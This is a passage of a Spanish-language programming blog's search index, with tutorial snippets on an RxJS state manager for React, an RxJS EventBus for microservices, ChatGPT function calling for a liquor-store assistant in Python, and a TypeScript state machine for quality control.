number ISBN: string author: string }export class BookStoreState { constructor(private book$: BehaviorSubject&lt;Book[]&gt;) {} setBooks(books: Book[]): void { this.book$.next(books); } addBook(book: Book): void { const books = this.book$.getValue(); if (books.find(b =&gt; b.ISBN === book.ISBN) === undefined) { this.book$.next([...books, book]); } } getBooks(): Observable&lt;Book[]&gt; { return this.book$.asObservable(); } getAuthors(): Observable&lt;string[]&gt; { return this.book$.pipe( map(books =&gt; books.map(book =&gt; book.author)), switchMap(authors =&gt; of([...new Set(authors)])) ); }}Podemos crear un state manager reactivo con un enfoque más orientado al dominio, ideal para aplicaciones frontend con lógicas de negocio complejas. Este enfoque no tiene nada que envidiarle a bibliotecas más elaboradas e incluso resulta más sencillo que utilizar Redux o Context de React.Generamos un archivo con la instancia del estado:export const bookStoreState = new BookStoreState(new BehaviorSubject(books));Y hacemos llamados en el componente para obtener un estado global:const books$ = bookStoreState.getBooks()const authors$ = bookStoreState.getAuthors()function BooksComponent() { const [books, booksError] = useObservableValue(books$, []) const [authors, autorsError] = useObservableValue(authors$, []) return ( &lt;div&gt; {/* Contenido de tu aplicación */} &lt;/div&gt; );}Si deseamos que este State Manager sea específico de un solo componente, podemos hacer uso de useRef():function BooksComponent() { const bookStoreRef = useRef(new BookStoreState(new BehaviorSubject(books))) const [books, booksError] = useObservableValue(bookStoreRef.current.getBooks(), []) const [authors, autorsError] = useObservableValue(bookStoreRef.current.getAuthors(), []) return ( &lt;div&gt; {/* Contenido de tu aplicación */} &lt;/div&gt; );}Estos ejemplos de uso nos proporcionan componentes más simples de implementar, ya que trasladamos la lógica compleja fuera de los hooks. Esto nos brinda varias ventajas: Componentes visuales más limpios y fáciles de mantener. Lógica compleja de negocio reutilizable sin atarse a una librería o framework en particular. Flujos asíncronos reutilizables. Uso de variables reactivas y en tiempo real. Pruebas unitarias de lógicas de negocio más sencillas.Por supuesto, hay algunas desventajas: Curva de aprendizaje alta para RxJS. Flujos complejos pueden generar observables difíciles de entender. Pruebas unitarias difíciles de crear con observables complejos, donde se necesita seguir minuciosamente el flujo.ConclusiónRxJS nos proporciona un enfoque avanzado para trabajar con flujos de datos, eventos y código reactivo. La facilidad de integración con React se debe a los hooks básicos proporcionados por esta librería. Con RxJS, podemos crear aplicaciones más complejas tanto en términos de código asíncrono como en el ámbito de lógicas de negocio." }, { "title": "Arquitecturas Orientadas a Eventos. Implementando un EventBus y RxJS en Conjunto", "url": "/posts/como-implementar-un-eventbus-y-rxjs-en-conjunto/", "categories": "Programacion, Typescript, Microservicios, Eventos", "tags": "Programacion, Typescript, Arquitectura de software", "date": "2023-08-16 08:32:00 -0400", "snippet": "En el mundo de la arquitectura de software, especialmente en entornos orientados a microservicios, la comunicación y la coordinación entre componentes son cruciales. Una forma efectiva de lograrlo es mediante el uso de patrones de diseño basados en eventos. Uno de estos patrones es el uso de un EventBus, que actúa como un intermediario entre los distintos componentes, permitiendo que se comuniquen y se mantengan desacoplados.En este artículo, exploraremos cómo implementar un EventBus utilizando RxJS, una librería de JavaScript que proporciona un conjunto poderoso de herramientas para trabajar con secuencias de eventos asincrónicos. Analizaremos un ejemplo de código que muestra cómo implementar y utilizar un EventBus en un contexto de arquitectura de microservicios.Parte 1: Contratos y DefinicionesEn la primera parte del código, encontramos las definiciones de contratos y eventos de dominio. Estos contratos establecen la base para nuestro EventBus.import { Observable, Subject, filter, iif } from 'rxjs';import { v4 as uuid } from 'uuid';// Representa un evento de dominio con una carga de datos específica.export abstract class DomainEvent&lt;D, E extends string&gt; { readonly datetime: Date = new Date(); readonly id = uuid() abstract name: E constructor(public readonly data: D) { }}// Define el contrato para un despachador de eventos.export interface EventDispatcher&lt;E extends string&gt; { dispatch&lt;T extends DomainEvent&lt;any, E&gt;&gt;(event: T): void;}// Define el contrato para un oyente de eventos.export interface EventListener&lt;E extends string&gt; { onEvent&lt;T extends DomainEvent&lt;any, E&gt;&gt;(name?: E): Observable&lt;T&gt;}// Define el contrato para un bus de eventos que actúa como despachador y oyente.export interface EventBus&lt;E extends string&gt; extends EventListener&lt;E&gt;, EventDispatcher&lt;E&gt; {}Parte 2: Implementación de EventosEn esta sección, se definen eventos específicos que heredan de DomainEvent, proporcionando detalles sobre datos y nombres de eventos. Nos centraremos en un ejemplo relacionado al retail.export type WarehouseEvents = \"PRODUCT_CREATED\" | \"CATEGORY_CREATED\" | \"STOCK_UPDATED\"class ProductCreated extends DomainEvent&lt;{ sku: string }, WarehouseEvents&gt; { name: WarehouseEvents = \"PRODUCT_CREATED\"}class StockUpdated extends DomainEvent&lt;{ sku: string, stock: number }, WarehouseEvents&gt; { name: WarehouseEvents = \"STOCK_UPDATED\"}class CategoryCreated extends DomainEvent&lt;string, WarehouseEvents&gt; { name: WarehouseEvents = \"CATEGORY_CREATED\"}Parte 3: Implementación del EventBusAquí es donde se implementa la lógica principal del EventBus utilizando RxJS./** * Una implementación de EventBus utilizando RxJS. */export class RxjsEventBus&lt;E extends string&gt; implements EventBus&lt;E&gt; { // Creación de un flujo de eventos usando un Subject private events$ = new Subject&lt;DomainEvent&lt;any, E&gt;&gt;() // Método para suscribirse a eventos específicos o todos los eventos onEvent&lt;T extends DomainEvent&lt;any, E&gt;&gt;(eventName?: E): Observable&lt;T&gt; { // Usando iif para filtrar eventos basado en el nombre del evento return iif( () =&gt; eventName !== undefined, this.events$.pipe(filter(event =&gt; eventName === event.name)), this.events$.asObservable() ) as Observable&lt;T&gt;; } // Método para despachar eventos al flujo dispatch&lt;T extends DomainEvent&lt;any, E&gt;&gt;(event: T): void { this.events$.next(event); }}La implementación de RxjsEventBus utiliza un flujo de eventos events$ implementado con Subject de RxJS para manejar la comunicación entre componentes. El método onEvent permite a los componentes suscribirse a eventos específicos o todos los eventos. Se utiliza el operador iif para filtrar eventos según el nombre del evento y devuelve un flujo de eventos observable. El método dispatch se utiliza para enviar eventos al flujo. En conjunto, esta implementación facilita la comunicación asincrónica entre componentes utilizando el patrón Observable/Observer de RxJS.Parte 4: Utilizando el EventBusFinalmente, se crea una instancia del EventBus, se suscribe a los eventos que deseamos y se despachan algunos eventos de ejemplo.const eventbus: EventBus&lt;WarehouseEvents&gt; = new RxjsEventBus&lt;WarehouseEvents&gt;()eventbus.onEvent() .subscribe({ next: event =&gt; console.log(\"all-events\", event), error: error =&gt; console.log(error) })eventbus.onEvent(\"CATEGORY_CREATED\") .subscribe({ next: event =&gt; console.log(\"category-event\", event.data), error: error =&gt; console.log(error) })eventbus.dispatch(new ProductCreated({ sku: \"9978363737\" }))eventbus.dispatch(new CategoryCreated(\"ELECTRONICS\"))eventbus.dispatch(new StockUpdated({ sku: \"6453993\", stock: 7 }))Importancia del Código en Arquitecturas Orientadas a EventosLa implementación del EventBus presentada en este código tiene un impacto significativo en las arquitecturas de microservicios orientadas a eventos. Aquí hay algunas razones clave: Desacoplamiento: El EventBus permite que los componentes se comuniquen sin tener conocimiento directo entre sí. Cada microservicio puede despachar eventos y suscribirse a eventos de interés, lo que reduce el acoplamiento entre los servicios. Escalabilidad: En un entorno de microservicios, donde los componentes pueden aumentar o disminuir dinámicamente, el EventBus facilita la adición de nuevos servicios y la adaptación a cambios en la demanda. Flexibilidad: Los eventos encapsulan acciones significativas dentro del sistema. Si se requiere una acción adicional en respuesta a un evento, es posible agregar oyentes sin afectar otros componentes. Rastreabilidad: Los eventos registran acciones y cambios en el sistema. Esto permite la trazabilidad de acciones y la auditoría, lo que es esencial para aplicaciones críticas y sistemas complejos. Mantenibilidad: Cambiar o extender el comportamiento de un componente se vuelve más sencillo, ya que los cambios pueden realizarse en el contexto del evento correspondiente sin afectar otros componentes. El EventBus en arquitecturas de microservicios es una pieza crucial para establecer comunicación efectiva y desacoplada entre componentes. Permite la construcción de sistemas altamente escalables, flexibles y mantenibles.Con EventBus, podremos comunicar desde componentes internos de una aplicación hasta microservicios totalmente separados. Solo debemos definir las implementaciones específicas dependiendo del caso que tengamos.ConclusiónEn este artículo, hemos explorado cómo implementar un EventBus utilizando RxJS en el contexto de arquitecturas de microservicios orientadas a eventos. Hemos desglosado el código paso a paso y hemos discutido la importancia de esta implementación en la construcción de sistemas flexibles y escalables.Esperamos que esta inmersión en la implementación de EventBus te haya brindado una comprensión sólida de cómo puedes utilizar esta herramienta para mejorar la comunicación y la coordinación entre los componentes de tus aplicaciones orientadas a eventos. Te animamos a experimentar con esta implementación y a explorar más a fondo cómo puede beneficiar tu propia arquitectura de software.Github repositoryMeme de cortesía" }, { "title": "ChatGPT Calling Functions ahora la AI puede llamar funciones de código", "url": "/posts/chatgp-calling-functions/", "categories": "Programacion, Python, AI, ChatGPT", "tags": "Programacion, Python, AI, ChatGPT", "date": "2023-06-19 11:32:00 -0400", "snippet": "Con Chatgpt dimos un salto enorme en el desarrollo de aplicaciones basadas en AI. Anteriormente, necesitábamos recolectar información y procesarla para entrenar nuestros modelos, pero ahora podemos incluso utilizar instrucciones simples para crear asistentes o realizar tareas más complejas mediante técnicas de “prompt engineering”. No obstante, OpenAI ha llevado este progreso un paso más allá con la introducción de las “Function calling”. Esta nueva funcionalidad permite que ChatGPT ejecute funciones personalizadas que hayamos definido previamente.Es importante destacar que ChatGPT no ejecutará directamente estas funciones por nosotros. En cambio, nos indicará cuándo es necesario ejecutarlas y qué parámetros se requieren para su funcionamiento. Nosotros seremos responsables de ejecutar la función y devolver el resultado al modelo en formato de texto. A partir de ahí, ChatGPT generará una respuesta amigable para el usuario.Sin más bla bla, vamos a un ejemplo con código:La forma base de ejecutar las function callings es la siguiente:import openaiimport json# Example dummy function hard coded to return the same weather# In production, this could be your backend API or an external APIdef get_current_weather(location, unit=\"fahrenheit\"): \"\"\"Get the current weather in a given location\"\"\" weather_info = { \"location\": location, \"temperature\": \"72\", \"unit\": unit, \"forecast\": [\"sunny\", \"windy\"], } return json.dumps(weather_info)def run_function_calls(): # Step 1: send the conversation and available functions to GPT messages = [{\"role\": \"user\", \"content\": \"What's the weather like in Boston?\"}] functions = [ { \"name\": \"get_current_weather\", \"description\": \"Get the current weather in a given location\", \"parameters\": { \"type\": \"object\", \"properties\": { \"location\": { \"type\": \"string\", \"description\": \"The city and state, e.g. San Francisco, CA\", }, \"unit\": {\"type\": \"string\", \"enum\": [\"celsius\", \"fahrenheit\"]}, }, \"required\": [\"location\"], }, } ] response = openai.ChatCompletion.create( model=\"gpt-3.5-turbo-0613\", messages=messages, functions=functions, function_call=\"auto\", # auto is default, but we'll be explicit )Definimos nuestra función custom y le decimos qué estructura de argumentos tiene. Esto no tiene mayor ciencia, así que haremos un pequeño ejemplo con una aplicación de terminal donde consultaremos los productos de una botillería.En base a un objeto JSON con las siguientes propiedades:{ \"name\": \"CACHANTUN CON GAS\", \"description\": \"Agua Mineral de gran pureza, embotellada desde 1920 directamente en su vertiente de origen.\", \"category\": \"Aguas\"}creamos las siguientes funciones:products = []with open('src/calling_functions_chatgpt/liquors.json', 'r') as file: products = json.load(file)def get_products(search: str,limit: int = 10, offset: int = 0): filtered = [] for p in products: if search.lower() in p['name'].lower() or search in p['description'].lower() or search.lower() in p['category'].lower(): filtered.append(p) return json.dumps(filtered[offset:limit])def get_categories(): categories = [] for c in list(map(lambda p: p['category'], products)): if c not in categories: categories.append(c) return json.dumps(categories)get_products() obtiene los productos y get_categories() las categorias disponibles de la tienda de licores.Implementación de CallFunctionDefiniremos 2 clases principales: CallFunction y ChatGPT.@dataclassclass CallFunction(ABC): @property def manifest(self) -&gt; Dict: ... @abstractclassmethod def execute(self, **kwargs): ... @property def function_name(self) -&gt; str: return self.manifest[\"name\"]La clase CallFunction es una clase abstracta que actúa como una plantilla para definir funciones personalizadas que pueden ser llamadas desde el modelo de chat ChatGPT. Tiene los siguientes métodos y propiedades: manifest: Es una propiedad que devuelve un diccionario que representa la información de la función. execute: Es un método abstracto que debe ser implementado por las subclases. Representa la ejecución de la función personalizada y toma como argumentos palabras clave (**kwargs). function_name: Es una propiedad que devuelve el nombre de la función obtenido del diccionario manifest.Implementación de ChatGPTclass ChatGPT: model = \"gpt-3.5-turbo-0613\" tokens = 0 chat_status: Any = None def __init__(self, prompt: str, call_functions: list[CallFunction] ): self.call_functions = call_functions self.functions = list(map(lambda fn: fn.manifest, call_functions)) self.messages = [{ 'role': 'system', 'content': prompt }] def add_message(self, message): self.messages.append(message) def update_token_usage(self, response): self.tokens += response['usage']['total_tokens'] def execute_function(self, function_name, arguments): function_arguments = json.loads(arguments) for cf in self.call_functions: if cf.function_name == function_name: return cf.execute(**function_arguments) def get_answer(self, response): return response[\"choices\"][0][\"message\"][\"content\"] def init_chat(self): response = openai.ChatCompletion.create( model=self.model, messages=self.messages, functions=self.functions, function_call=\"auto\", temperature=0 ) self.update_token_usage(response) return self.get_answer(response) def ask(self, input_message, temperature=0): self.add_message({ 'role': 'user', 'content': input_message }) response = openai.ChatCompletion.create( model=self.model, messages=self.messages, functions=self.functions, function_call=\"auto\", temperature=temperature ) self.update_token_usage(response) message = response[\"choices\"][0][\"message\"] # verify function calling function_call = message.get(\"function_call\") if function_call: # execute function function_name = function_call[\"name\"] self.chat_status.status(f\"Llamando a la funcion {function_name} {function_call['arguments']}\") function_response = self.execute_function(function_name, function_call['arguments']) self.chat_status.status(f\"{function_name}() ejecutada.\") # update messages self.add_message(message) self.add_message({ \"role\": \"function\", \"name\": function_name, \"content\": function_response }) # send messages to chatgpt second_response = openai.ChatCompletion.create( model=self.model, messages=self.messages, temperature=temperature ) self.update_token_usage(second_response) return self.get_answer(second_response) # save message to context self.add_message(message) # no function calling return self.get_answer(response) def progress(self, msg): self.chat_status = log.progress(msg) def status(self, msg): if self.chat_status: self.chat_status.status(msg) def success(self, msg): if self.chat_status: self.chat_status.success(msg)La clase ChatGPT es la clase principal que representa un modelo de chat basado en el modelo GPT-3.5-turbo-6013. Aquí hay una descripción de sus métodos y propiedades: model: Una variable de clase que almacena el nombre del modelo GPT-3.5-turbo-6013 (este es el modelo que soporta function calling) utilizado. tokens: Una variable de clase que realiza un seguimiento del número total de tokens utilizados. chat_status: Una variable de instancia que almacena el estado actual del chat.El método init es el constructor de la clase ChatGPT. Recibe una cadena de texto prompt y una lista de objetos CallFunction llamada call_functions como argumentos. Inicializa las variables de instancia y crea una lista functions que contiene los diccionarios manifest de las funciones proporcionadas.El método add_message() agrega un mensaje a la lista messages que se utiliza para almacenar el historial de mensajes del chat.El método update_token_usage() actualiza el contador de tokens utilizando la información proporcionada en la respuesta del modelo de chat.El método execute_function() toma el nombre de una función y sus argumentos como entrada y busca la función correspondiente en la lista de call_functions. Si encuentra una coincidencia, llama al método execute de la función correspondiente con los argumentos proporcionados y devuelve el resultado.El método get_answer() toma la respuesta del modelo de chat y extrae el contenido del primer mensaje de la respuesta.El método init_chat() inicializa el chat enviando una solicitud al modelo de chat. Utiliza el modelo model, la lista messages, la lista functions, y establece la llamada a la función en “auto” con una temperatura de 0. Actualiza el contador de tokens y devuelve la respuesta del modelo de chat.El método ask() se utiliza para hacer una pregunta o enviar un mensaje al modelo de chat. Toma un mensaje de entrada y una temperatura (opcional) como argumentos. Agrega el mensaje del usuario a la lista messages y envía una solicitud al modelo de chat. Al igual que en init_chat(), utiliza el modelo model, la lista messages, la lista functions, y establece la llamada a la función en “auto” con la temperatura proporcionada. Actualiza el contador de tokens y procesa la respuesta. Si la respuesta contiene un mensaje de llamada a función, extrae el nombre de la función y sus argumentos, ejecuta la función correspondiente utilizando execute_function(), agrega los mensajes relevantes a la lista messages, y envía una segunda solicitud al modelo de chat. Finalmente, devuelve la respuesta del modelo de chat.Los métodos progress(), status(), y success() nos ayudan a generar mensajes de información al usuario.Aplicación de terminalAhora crearemos una aplicación de terminal en la que ejecutaremos las llamadas a la API de ChatGPT. Esta será una función que le preguntará al usuario las acciones a realizar.def command_line(chatgpt: ChatGPT): try: print() assistant_progress = log.progress('AI Assistant') assistant_progress.status('Iniciando asistente...') assistant_input = chatgpt.init_chat() assistant_progress.success('Asistente listo!') while True: user_input = input(f\"{green_color('[Assistant]')} {assistant_input}\\n\\n{green_color('[User]')} \") print() chatgpt.progress('Estado chat context') # exit command if user_input == 'exit': break # connecting with openai chatgpt.status('Pensando...') assistant_input = chatgpt.ask(user_input) chatgpt.success(\"Listo!\") except KeyboardInterrupt: log.info('Saliendo...') log.info(f'Total tokens: {chatgpt.tokens}\\n')La explicaión de la función command_line() es la siguiente: La función command_line() toma un objeto ChatGPT como argumento. Dentro de la función, se inicializa una barra de progreso llamada assistant_progress que muestra el estado del asistente. Se establece un mensaje de estado inicial indicando que el asistente se está iniciando. Se llama al método init_chat() del objeto chatgpt para iniciar el chat con el asistente. El resultado se asigna a la variable assistant_input, que contiene la respuesta inicial del asistente. La barra de progreso se actualiza para indicar que el asistente está listo. Se inicia un bucle while que se ejecutará continuamente hasta que se ingrese el comando “exit”. Se solicita la entrada del usuario con el mensaje [User] y se asigna a la variable user_input. Si el valor de user_input es igual a “exit”, se rompe el bucle y se sale de la función. Si no es un comando de salida, se actualiza la barra de progreso. Se llama al método ask() del objeto chatgpt pasando la user_input como argumento. Esto envía la entrada del usuario al asistente y devuelve la respuesta del asistente. La respuesta se asigna a assistant_input. La barra de progreso se actualiza para indicar que el asistente ha completado su tarea y está listo para responder. Si se produce una excepción de interrupción de teclado (por ejemplo, cuando se presiona Ctrl+C), se imprime un mensaje indicando que se está saliendo del programa. Finalmente Se imprime la cantidad total de tokens utilizados durante la ejecución del asistente. Ahora definiremos nuestras CallFunction que ChatGPT ejecutará según corresponda.class GetProductsCallFunction(CallFunction): manifest = { \"name\": \"get_products\", \"description\": \"Obtiene los productos disponibles de la botilleria\", \"parameters\": { \"type\": \"object\", \"properties\": { \"search\": { \"type\": \"string\", \"description\": \"busqueda por palabra clave\", }, \"limit\": { \"type\": \"number\", \"description\": \"cantidad limite de datos a traer\" }, \"offset\": { \"type\": \"number\", \"description\": \"indice donde empieza a traer datos\" } } # \"required\": [\"search\"], } } def execute(self, **kwargs): return get_products(**kwargs) class GetCategoriesCallFunction(CallFunction): manifest = { \"name\": \"get_categories\", \"description\": \"Obtiene las categorias disponibles de la botilleria\", \"parameters\": { \"type\": \"object\", \"properties\": {} } } def execute(self, **kwargs): return get_categories()Implementamos las clases GetProductsCallFunction y GetCategoriesCallFunction que heredan de CallFunction con sus correspondientes descripciones de los argumentos y las funciones que ChatGPT podrá usar. Ya con estas clases definidas instanciaremos la clase ChatGPT con la siguiente configuración:chatgpt = ChatGPT( prompt=\"Se un util y amable asistente de una botilleria, que resolvera consultas sobre sus productos existentes. trabajaras con un limite de 15 items por consulta\", call_functions=[ GetProductsCallFunction(), GetCategoriesCallFunction() ])A la clase ChatGPT le entregamos el parámetro prompt, donde definimos las instrucciones deseadas, y definimos el parámetro call_functions, donde les entregamos las CallFunctions definidas previamente.Finalmente hacemos uso de la función command_line():command_line(chatgpt=chatgpt)Ahora ejecutamos#!/bin/bashpython src/calling_function_chatgpt/app.pyNuestro asistente inicia:Y le realizaremos 2 preguntas: ¿Qué categorías de bebidas existen? ¿Qué cervezas tienes disponibles?Obtendremos las siguientes respuestas:Preguntamos por las categorias.y preguntamos por los productos de la categoria que queramos en este caso preguntamos por cervezas.ConclusionesChatGPT ha demostrado ser una herramienta valiosa al responder nuestras preguntas utilizando las funciones que le hemos indicado. Sin embargo, sus capacidades van más allá de simplemente proporcionar respuestas. Esta nueva característica de calling function le brinda una mayor versatilidad al desarrollo de aplicaciones basadas en IA.Con el uso de calling function podemos lograr lo siguiente: Orquestar acciones fuera de ChatGPT: Ahora podemos utilizar ChatGPT para coordinar y controlar acciones en otros sistemas o servicios, lo que amplía sus posibilidades de uso. Ejecutar acciones que ChatGPT no puede hacer: Gracias a la capacidad de integrar funciones externas, podemos realizar tareas complejas que están fuera del alcance de ChatGPT por sí solo. Esto permite abordar una variedad más amplia de problemas y escenarios. Integraciones más rápidas y sencillas: La funcionalidad de “calling function” facilita la integración de ChatGPT con otros sistemas y servicios. Esto agiliza el proceso de desarrollo de aplicaciones y permite crear soluciones más completas de manera más eficiente. Evitar dependencias con librerías de terceros: Al poder ejecutar acciones externas directamente desde ChatGPT, se reduce la necesidad de depender de librerías o herramientas adicionales. Esto simplifica el proceso de desarrollo y reduce posibles problemas de compatibilidad. Este ejemplo simple y fácil demuestra cómo podemos aprovechar la nueva funcionalidad de “calling function” para crear aplicaciones innovadoras más allá del típico asistente de chat. Las posibilidades son amplias y prometen un futuro emocionante para el desarrollo de aplicaciones basadas en IA.Github repositoryMeme de cortesía" }, { "title": "Conociendo el patrón de diseño state machine.", "url": "/posts/state-machine-design-pattern/", "categories": "Programacion, Typescript, Arquitectura de software, Patrones de diseño", "tags": "Design Patterns, Typescript", "date": "2023-06-07 11:32:00 -0400", "snippet": "Sí correcto este es otro post de patrones de diseño. lo distinto es que es uno de los que nadie habla pero se usa muy a menudo y no nos damos ni cuenta. Hoy voy a hablarles del patrón de diseño conocido como “state machine” (o máquina de estados). ¡Sí, también esta también relacionado con esos diagramas llenos de flechas y círculos que nos ayudan a modelar el comportamiento de nuestros sistemas! Pero no se preocupen, no vamos a sumergirnos en una telenovela de diagramas aburridos; en su lugar, exploraremos un ejemplo práctico y util para ilustrar cómo funciona este patrón en el mundo real.¿Qué es una State Machine?El patrón State Machine se utiliza para modelar y controlar el comportamiento de un objeto en función de su estado interno. Consiste en definir una serie de estados posibles y las transiciones permitidas entre ellos. Cada estado representa una configuración y comportamiento específico del objeto, y las transiciones definen cómo se puede cambiar de un estado a otro.Ventajas del patrón de diseño State Machine: Claridad y estructura: Proporciona una forma clara y estructurada de modelar el comportamiento de un sistema, facilitando la comprensión de las transiciones de estado y las acciones asociadas. Mantenibilidad y extensibilidad: Al separar el comportamiento en diferentes estados y transiciones, la máquina de estados se vuelve modular, lo que facilita el mantenimiento y la extensión del sistema sin afectar otras partes. Control de flujo: Permite un control de flujo preciso y determinista, ya que cada estado representa un conjunto definido de acciones y condiciones.Desventajas del patrón de diseño State Machine: Complejidad inicial: Requiere un esfuerzo adicional y puede resultar más complejo en comparación con enfoques lineales, ya que implica definir estados, transiciones y acciones, lo que aumenta la complejidad del código. Escalabilidad limitada: A medida que el sistema crece y las interacciones entre estados se vuelven más complejas, mantener y escalar la máquina de estados puede volverse difícil, ya que agregar nuevos estados y transiciones implica modificar múltiples partes del código. Sobrecarga de memoria: Dependiendo de la implementación, puede requerir más memoria para almacenar el estado actual y los datos asociados, lo cual puede ser una preocupación en sistemas con restricciones de recursos o dispositivos con capacidades limitadas.Implementacion de machine stateImplementaremos el Patrón State Machine patrón State Machine utilizando TypeScript y la biblioteca RxJS.import { filter, map } from 'rxjs/operators';export interface State&lt;T&gt; { name: T; data: any;}export interface Transition&lt;T&gt; { from: T; to: T[];}export interface StateMachineConfig&lt;T&gt; { initialState: State&lt;T&gt;; transitions?: Transition&lt;T&gt;[];}export class InvalidStateError extends Error { constructor(message: string) { super(message) this.name = 'InvalidStateError' this.stack = '' }}Este código define las siguientes interfaces y clases que actuan como base de nuestro modelo de StateMachine:StateLa interfaz State&lt;T&gt; representa un estado en la máquina de estados. Tiene dos propiedades:name: representa el nombre del estado.data: almacena cualquier dato adicional asociado con el estado.TransitionLa interfaz Transition&lt;T&gt; representa una transición entre dos estados. Tiene dos propiedades:from: representa el estado desde el cual se realiza la transición.to: es un arreglo que contiene los estados a los que se puede transicionar desde el estado de origen.StateMachineConfigLa interfaz StateMachineConfig&lt;T&gt; define la configuración inicial de la máquina de estados. Tiene dos propiedades:initialState: representa el estado inicial de la máquina de estados.transitions (opcional): es un arreglo de objetos Transition que define las transiciones permitidas entre los estados.InvalidStateErrorLa clase InvalidStateError es una subclase de Error y se utiliza para representar errores relacionados con transiciones de estados no válidas. Se personaliza con un mensaje específico de error.StateMachineEn esta parte de la implementación, se define la clase StateMachine&lt;T&gt; que implementa la lógica principal de la máquina de estados. Incluyendo el manejo de estados y la validacion entre transiciones.export class StateMachine&lt;T&gt; { private currentState: BehaviorSubject&lt;State&lt;T&gt;&gt;; private transitions: Transition&lt;T&gt;[]; constructor(config: StateMachineConfig&lt;T&gt;) { this.currentState = new BehaviorSubject(config.initialState) this.transitions = config.transitions ? config.transitions : [] } state() { return this.currentState.asObservable() } stateValue(){ return this.currentState.getValue() } stateFor(stateName: T) { return this.currentState.asObservable().pipe( filter(state =&gt; state.name === stateName), map(state =&gt; state.data) ) } transition(state: State&lt;T&gt;) { const currentState = this.currentState.getValue().name const transitionToValidate = this.transitions .filter(t =&gt; t.from === currentState) .map(t =&gt; t.to) .reduce((result, element) =&gt; result.concat(element), []) if (!transitionToValidate.includes(state.name)) { throw new InvalidStateError(`The transition from \"${currentState}\" to \"${state.name}\" is invalid. The valid transitions for \"${currentState}\" are \"${transitionToValidate}\".`) } this.currentState.next(state) }}Nuestra clase StateMachine&lt;T&gt; Tiene los siguientes miembros y métodos:MiembroscurrentState: Un objeto BehaviorSubject&lt;State&lt;T&gt;&gt; que almacena el estado actual de la máquina de estados. Es un BehaviorSubject de la biblioteca RxJS, que permite observar cambios en el estado.transitions: Un array de objetos Transition&lt;T&gt; que almacena las transiciones definidas para la máquina de estados.ConstructorEl constructor de StateMachine&lt;T&gt; acepta un objeto StateMachineConfig&lt;T&gt; como parámetro. Inicializa el currentState con el estado inicial proporcionado en la configuración y asigna las transiciones si se proporcionaron. Si no se proporcionan transiciones, se asigna un array vacío.Métodosstate(): Devuelve un observable que emite el estado actual de la máquina de estados. Los observadores pueden suscribirse a este observable para recibir actualizaciones sobre cambios de estado.stateValue(): Devuelve el valor actual del estado sin la funcionalidad de observación. Proporciona acceso directo al estado actual sin la necesidad de suscribirse a un observable.stateFor(stateName: T): Devuelve un observable que filtra el estado actual por el nombre proporcionado. Solo emite el estado si coincide con el nombre especificado y mapea el resultado al valor de data del estado.transition(state: State&lt;T&gt;): Realiza una transición de estado. Comprueba si la transición proporcionada es válida, verificando si existe una transición definida desde el estado actual hacia el estado proporcionado. Si la transición es inválida, se lanza un InvalidStateError con un mensaje de error descriptivo.Ejemplo de Control de calidad de una manufactura de un producto.Para implementar un ejemplo práctico, crearemos una máquina de estados para controlar el proceso de control de calidad de un producto. El objetivo es modelar y gestionar los diferentes estados por los que pasa un producto durante el proceso de control de calidad.La máquina de estados se define utilizando el tipo QualityControlState, que es una unión de literales de cadena que representan los posibles estados del control de calidad. Estos estados son: factory-proccess: proceso de fabricación. visual-inspection: inspección visual. functional-inspection: inspección funcional. approved: aprobado. rejected: rechazado.export type QualityControlState = 'factory-proccess' | 'visual-inspection' | 'functional-inspection' | 'approved' | 'rejected'La configuración de la máquina de estados se define en la variable config. El estado inicial se establece como factory-proccess y se proporciona una descripción de datos asociada al estado inicial. A continuación, se definen las transiciones permitidas entre los estados. Por ejemplo, se puede realizar una transición desde factory-proccess a visual-inspection, desde visual-inspection a functional-inspection o rejected, etc.const config: StateMachineConfig&lt;QualityControlState&gt; = { initialState: { name: 'factory-proccess', data: 'Building product' }, transitions: [ { from: 'factory-proccess', to: ['visual-inspection'] }, { from: 'visual-inspection', to: ['functional-inspection', 'rejected'] }, { from: 'functional-inspection', to: ['rejected', 'approved'] }, { from: 'rejected', to: ['factory-proccess'] }, ]}Se crea una instancia de la clase StateMachine&lt;QualityControlState&gt; llamada productState utilizando la configuración definida. Esta instancia representa el estado actual del producto durante el control de calidad.let productState = new StateMachine&lt;QualityControlState&gt;(config)La función executeTransitions se utiliza para ejecutar las transiciones con un intervalo de 1 segundo. Recibe un arreglo de estados y devuelve un observable que emite los estados uno por uno en el intervalo de tiempo especificado. En este ejemplo, se utiliza executeTransitions para simular el progreso del control de calidad.const executeTransitions = (states: State&lt;QualityControlState&gt;[]) =&gt; { return interval(1000).pipe( take(states.length), map((index) =&gt; states[index]) )}La función successTransitions simula una serie de transiciones exitosas en el control de calidad. Define un arreglo de estados que representan las transiciones a realizar, como la inspección visual, la inspección funcional y la aprobación del producto. Luego, se suscribe al observable devuelto por executeTransitions y cada vez que se emite un estado, se realiza la transición correspondiente utilizando el método transition de la instancia productState.const successTransitions = () =&gt; { const transitions: State&lt;QualityControlState&gt;[] = [ { name: 'visual-inspection', data: 'Performing visual inspection' }, { name: 'functional-inspection', data: 'Performing functional inspection' }, { name: 'approved', data: 'Product approved' }, ]; executeTransitions(transitions) .subscribe((state: State&lt;QualityControlState&gt;) =&gt; productState.transition(state));}La función failedTransition simula una transición fallida en el control de calidad. Define un arreglo de estados que representa la inspección visual y el rechazo del producto. Al igual que en successTransitions, se realiza la transición correspondiente utilizando el método transition.const failedTransition = () =&gt; { const transitions: State&lt;QualityControlState&gt;[] = [ { name: 'visual-inspection', data: 'Performing visual inspection' }, { name: 'rejected', data: 'Product rejected' }, ]; executeTransitions(transitions) .subscribe((state: State&lt;QualityControlState&gt;) =&gt; productState.transition(state));}La función invalidTransitions simula una serie de transiciones inválidas en el control de calidad. Define un arreglo de estados que intenta realizar una transición desde visual-inspection a approved, lo cual no es una transición permitida. Se suscribe al observable devuelto por executeTransitions y cuando se intenta realizar la transición inválida, se captura el error utilizando el bloque error en la suscripción.const invalidTransitions = () =&gt; { const transitions: State&lt;QualityControlState&gt;[] = [ { name: 'visual-inspection', data: 'Performing visual inspection' }, { name: 'approved', data: 'Product approved' }, ]; executeTransitions(transitions) .subscribe({ next: (state: State&lt;QualityControlState&gt;) =&gt; productState.transition(state), error: (err) =&gt; console.error(err.message) });}Finalmente, se realiza la suscripción al estado actual del producto utilizando el método state() de productState. Cada vez que el estado cambia, se imprime el nuevo estado en la consola.productState .state() .subscribe(state =&gt; console.log('Product state', state))successTransitions()Al llamar a successTransitions(), se ejecutan las transiciones exitosas simuladas y se observa cómo el estado del producto cambia a medida que avanza el proceso de control de calidad.Finalmente el código completo es el siguiente:export type QualityControlState = 